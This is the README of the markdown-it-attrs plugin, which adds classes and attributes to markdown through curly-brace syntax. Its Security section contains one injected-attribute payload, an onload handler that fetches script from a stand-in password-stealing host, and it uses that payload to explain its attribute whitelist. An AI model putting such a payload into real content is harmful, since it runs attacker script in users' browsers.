# markdown-it-attrs [![Build Status](https://travis-ci.org/arve0/markdown-it-attrs.svg?branch=master)](https://travis-ci.org/arve0/markdown-it-attrs) [![npm version](https://badge.fury.io/js/markdown-it-attrs.svg)](http://badge.fury.io/js/markdown-it-attrs) [![Coverage Status](https://coveralls.io/repos/github/arve0/markdown-it-attrs/badge.svg?branch=master)](https://coveralls.io/github/arve0/markdown-it-attrs?branch=master) <!-- omit in toc -->

Add classes, identifiers and attributes to your markdown with `{.class #identifier attr=value attr2="spaced value"}` curly brackets, similar to [pandoc's header attributes](http://pandoc.org/README.html#extension-header_attributes).

# Table of contents <!-- omit in toc -->
- [Examples](#examples)
- [Install](#install)
- [Support](#support)
- [Usage](#usage)
- [Security](#security)
- [Limitations](#limitations)
- [Ambiguity](#ambiguity)
- [Custom rendering](#custom-rendering)
- [Custom blocks](#custom-blocks)
- [Custom delimiters](#custom-delimiters)
- [Development](#development)
- [License](#license)
## Examples
Example input:
```md
# header {.style-me}
paragraph {data-toggle=modal}
```

Output:
```html
<h1 class="style-me">header</h1>
<p data-toggle="modal">paragraph</p>
```

Works with inline elements too:
```md
paragraph *style me*{.red} more text
```

Output:
```html
<p>paragraph <em class="red">style me</em> more text</p>
```

And fenced code blocks:
<pre><code>
```python {data=asdf}
nums = [x for x in range(10)]
```
</code></pre>

Output:
```html
<pre><code data="asdf" class="language-python">
nums = [x for x in range(10)]
</code></pre>
```

You can use `..` as a short-hand for `css-module=`:

```md
Use the css-module green on this paragraph. {..green}
```

Output:
```html
<p css-module="green">Use the css-module green on this paragraph.</p>
```

Also works with spans, in combination with the [markdown-it-bracketed-spans](https://github.com/mb21/markdown-it-bracketed-spans) plugin (to be installed and loaded as such then):

```md
paragraph with [a style me span]{.red}
```

Output:
```html
<p>paragraph with <span class="red">a style me span</span></p>
```

## Install

```
$ npm install --save markdown-it-attrs
```

## Support
Library is considered done from my part. I'm maintaining it with bug fixes and
security updates.

I'll approve pull requests that are easy to understand. Generally not willing
merge pull requests that increase maintainance complexity. Feel free to open
anyhow and I'll give my feedback.

If you need some extra features, I'm available for hire.

## Usage

```js
var md = require('markdown-it')();
var markdownItAttrs = require('markdown-it-attrs');

md.use(markdownItAttrs, {
  // optional, these are default options
  leftDelimiter: '{',
  rightDelimiter: '}',
  allowedAttributes: []  // empty array = all attributes are allowed
});

var src = '# header {.green #id}\nsome text {with=attrs and="attrs with space"}';
var res = md.render(src);

console.log(res);
```

[demo as jsfiddle](https://jsfiddle.net/arve0/hwy17omn/)


## Security
A user may insert rogue attributes like this:
```js
![](img.png){onload=fetch('https://imstealingyourpasswords.com/script.js').then(...)}
```

If security is a concern, use an attribute whitelist:

```js
md.use(markdownItAttrs, {
  allowedAttributes: ['id', 'class', /^regex.*$/]
});
```

Now only `id`, `class` and attributes beginning with `regex` are allowed:

```md
text {#red .green regex=allowed onclick=alert('hello')}
```

Output:
```html
<p id="red" class="green" regex="allowed">text</p>
```

## Limitations
markdown-it-attrs relies on markdown parsing in markdown-it, which means some
special cases are not possible to fix. Like using `_` outside and inside
attributes:

```md
_i want [all of this](/link){target="_blank"} to be italics_
```

Above example will render to:
```html
<p>_i want <a href="/link">all of this</a>{target=&quot;<em>blank&quot;} to be italics</em></p>
```

...which is probably not what you wanted. Of course, you could use `*` for
italics to solve this parsing issue:

```md
*i want [all of this](/link){target="_blank"} to be italics*
```

Output:
```html
<p><em>i want <a href="/link" target="_blank">all of this</a> to be italics</em></p>
```

## Ambiguity
When class can be applied to both inline or block element, inline element will take precedence:
```md
- list item **bold**{.red}
```

Output:
```html
<ul>
<li>list item <strong class="red">bold</strong></li>
<ul>
```

If you need the class to apply to the list item instead, use a space:
```md
- list item **bold** {.red}
```

Output:
```html
<ul>
<li class="red">list item <strong>bold</strong></li>
</ul>
```

If you need the class to apply to the `<ul>` element, use a new line:
```md
- list item **bold**
{.red}
```

Output:
```html
<ul class="red">
<li>list item <strong>bold</strong></li>
</ul>
```

If you have nested lists, curlys after new lines will apply to the nearest `<ul>` or `<ol>`. You may force it to apply to the outer `<ul>` by adding curly below on a paragraph by its own:
```md
- item
  - nested item {.a}
{.b}

{.c}
```

Output:
```html
<ul class="c">
  <li>item
    <ul class="b">
      <li class="a">nested item</li>
    </ul>
  </li>
</ul>
```

This is not optimal, but what I can do at the momemnt. For further discussion, see https://github.com/arve0/markdown-it-attrs/issues/32.

Similar for tables, attributes must be _two_ new lines below:
```md
header1 | header2
------- | -------
column1 | column2

{.special}
```

Output:
```html
<table class="special">
  <thead>
    <tr>
      <th>header1</th>
      <th>header2</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>column1</td>
      <td>column2</td>
    </tr>
  </tbody>
</table>
```

If you need finer control, [decorate](https://github.com/rstacruz/markdown-it-decorate) might help you.

## Custom rendering
If you would like some other output, you can override renderers:

```js
const md = require('markdown-it')();
const markdownItAttrs = require('markdown-it-attrs');

md.use(markdownItAttrs);

// custom renderer for fences
md.renderer.rules.fence = function (tokens, idx, options, env, slf) {
  const token = tokens[idx];
  return  '<pre' + slf.renderAttrs(token) + '>'
    + '<code>' + token.content + '</code>'
    + '</pre>';
}

let src = [
  '',
  '```js {.abcd}',
  'var a = 1;',
  '```'
].join('\n')

console.log(md.render(src));
```

Output:
```html
<pre class="abcd"><code>var a = 1;
</code></pre>
```

Read more about [custom rendering at markdown-it](https://github.com/markdown-it/markdown-it/blob/master/docs/architecture.md#renderer).


## Custom blocks
`markdown-it-attrs` will add attributes to any `token.block == true` with {}-curlies in end of `token.info`. For example, see [markdown-it/rules_block/fence.js](https://github.com/markdown-it/markdown-it/blob/760050edcb7607f70a855c97a087ad287b653d61/lib/rules_block/fence.js#L85) which [stores text after the three backticks in fenced code blocks to `token.info`](https://markdown-it.github.io/#md3=%7B%22source%22%3A%22%60%60%60js%20%7B.red%7D%5Cnfunction%20%28%29%20%7B%7D%5Cn%60%60%60%22%2C%22defaults%22%3A%7B%22html%22%3Afalse%2C%22xhtmlOut%22%3Afalse%2C%22breaks%22%3Afalse%2C%22langPrefix%22%3A%22language-%22%2C%22linkify%22%3Atrue%2C%22typographer%22%3Atrue%2C%22_highlight%22%3Atrue%2C%22_strict%22%3Afalse%2C%22_view%22%3A%22debug%22%7D%7D).

Remember to [render attributes](https://github.com/arve0/markdown-it-attrs/blob/a75102ad571110659ce9545d184aa5658d2b4a06/index.js#L100) if you use a custom renderer.

## Custom delimiters

To use different delimiters than the default, add configuration for `leftDelimiter` and `rightDelimiter`:

```js
md.use(attrs, {
  leftDelimiter: '[',
  rightDelimiter: ']'
});
```

Which will render

```md
# title [.large]
```

as

```html
<h1 class="large">title</h1>
```

## Development
Tests are in [test.js](./test.js).

Run all tests:
```sh
npm test
```

Run particular test:
```sh
npm test -- -g "not crash"
```

In tests, use helper function `replaceDelimiters` to make test run with
different delimiters (`{}`, `[]` and `[[]]`).

For easy access to HTML output you can use [debug.js](./debug.js):

```sh
node debug.js # will print HTML output
```

Please do **not** submit pull requests with changes in package version or built
files like browser.js.

## License

MIT © [Arve Seljebu](http://arve0.github.io/)
